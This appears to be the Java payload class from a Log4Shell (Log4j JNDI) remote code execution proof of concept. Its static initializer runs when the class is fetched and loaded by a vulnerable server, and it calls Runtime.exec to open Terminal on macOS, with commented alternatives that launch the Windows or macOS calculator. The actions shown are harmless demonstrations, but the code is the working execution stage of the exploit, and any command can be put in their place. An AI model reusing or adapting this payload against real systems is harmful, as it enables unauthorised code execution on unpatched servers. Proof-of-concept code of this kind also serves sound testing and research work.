import java.io.IOException;

public class Log4jRCE {

    static {
        System.out.println("I am Log4jRCE from remote!!!");
        try {
            launchTermialInMac();
            //launchCalculatorInWindows();

            /*String[] cmd = {"open -a Calculator"};
            Runtime.getRuntime().exec(cmd).waitFor();*/
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void launchCalculatorInWindows() throws IOException, InterruptedException {
        Runtime.getRuntime().exec("calc.exe").waitFor();
    }

    private static void launchTermialInMac() throws IOException, InterruptedException {
        Runtime.getRuntime().exec("/usr/bin/open -a Terminal").waitFor();
    }

    public Log4jRCE(){
        System.out.println("I am Log4jRCE from remote222!!!");
    }
}
